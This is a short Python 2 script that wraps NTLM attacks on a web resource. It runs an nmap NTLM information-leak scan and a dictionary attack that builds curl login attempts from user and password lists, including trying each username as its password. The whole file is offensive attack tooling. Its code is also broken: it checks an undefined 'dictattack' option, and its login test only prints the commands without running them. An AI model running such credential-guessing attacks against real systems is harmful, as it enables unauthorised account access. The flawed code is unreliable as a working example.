#!/usr/bin/python
# Simple wrapper for some command line NTLM attacks

import argparse
import sys
import os.path
from urlparse import urlparse

def test_login( username, password, url ):
  print "Testing " + username + " : " + password + " at " + url
  cmd = "curl -I --ntlm --user " + username + ":" + password + " -k " + url
  print cmd

parser = argparse.ArgumentParser(description="Wrapper for NTLM info leak and NTLM dictionary attack")
parser.add_argument("-u", "--user", help="Username to dictionary attack as")
parser.add_argument("-U", "--userlist", help="Username list to dictionary attack as")
parser.add_argument("-p", "--password", help="Password to dictionary attack as")
parser.add_argument("-D", "--domain", help="NTLM domain name to attack")
parser.add_argument("-P", "--passlist", help="Password list to dictionary attack as")
parser.add_argument("-i", "--info", action="store_true", help="Exploit NTLM info leak")
parser.add_argument("-l", "--login", action="store_true", help="Test logins (requires username and passwords)")
parser.add_argument("-s", "--same", action="store_true", help="Try password=username")
parser.add_argument("url", help="URL of NTLM protected resource")
args = parser.parse_args()

if not args.url:
  parser.print_usage()
  sys.exit(2)

url = urlparse(args.url)
if not url.port:
  if url.scheme == 'https':
    port = 443
  else:
    port = 80
else:
  port = url.port


if args.info:
  # Run NTLM info leak
  cmd = "nmap -p" + str(port) + " --script http-ntlm-info --script-args http-ntlm-info.root="+url.path+" "+url.netloc
  print cmd
  os.system( cmd )

if args.dictattack:
  # Check user
  if not args.user and not args.userlist and not os.path.isfile(args.userlist):
    print 'Need user to attack as'
    parser.print_usage()
    sys.exit(2)

  # Check password
  if not args.password and not args.passlist and not os.path.isfile(args.passlist):
    print 'Need password to attack as'
    parser.print_usage()
    sys.exit(2)
  
  if args.passlist:
    print "Password list"
    fp = open( args.passlist, "r" )
    for p in fp:
      if args.userlist:
        fu = open( args.userlist, "r" )
        for u in fu:
          # many users, many passwords
          test_login( u, p, url.geturl() )
          if args.same:
            test_login( u, u, url.geturl() )
        fu.close()
      else:
        # One user, many passwords
        test_login( args.user, p, url.geturl() )
        if args.same:
          test_login( args.user, args.user, url.geturl() )
    fp.close()
  elif args.userlist:
    print "User list"
    fu = open( args.userlist, "r" )
    for u in fu:
      # Many users, one password
      test_login( u, args.password, url.geturl() )
      if args.same:
        test_login( u, u, url.geturl() )
    fu.close()
  else:
    # One user, one password
    print "Single user / password" 
    test_login( args.user, args.password, url.geturl() )
 
print "Done"
